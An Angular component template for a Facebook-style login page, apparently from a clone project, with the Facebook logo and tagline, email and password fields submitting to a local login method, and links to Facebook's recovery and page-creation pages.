<div class="login-container">
    <header class="login__header">
        <div class="login__header__left">
            <img src="assets/fb-logo-1.jpg" alt="logo">
            <h2>Facebook helps you connect and share with people in your life.</h2>
        </div>
        <div class="login__header__right">
            <mat-card class="login__header__right__card">
                <mat-card-content class="login__header__right__card__content">
                    <form #form="ngForm" class="login-form" (ngSubmit)="login(form)">
                        <!-- <mat-icon matPrefix>person</mat-icon> -->
                        <!-- <fa-icon icon="fal-user"></fa-icon> -->
                        <input type="text" name="email" ngModel placeholder="Email address or Phone number" required>
                        <input type="password" name="password" ngModel placeholder="Password" required>
                        <button type="submit"
                        class="login-button"
                        [disabled]="form.invalid || form.pending">Log in</button>
                    </form>
                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
                    <button class="create-account" (click)="openRegister()">Create New Account</button>
                </mat-card-content>
            </mat-card>
            <p class="tagline"><a href="https://www.facebook.com/pages/create/?ref_type=registration_form"><strong>Create a Page</strong></a> for a celebrity, brand or business.</p>
        </div>
    </header>
    <footer class = "login__footer">
        <img src="assets/footer_crop.png" alt="footer">
    </footer>
</div>
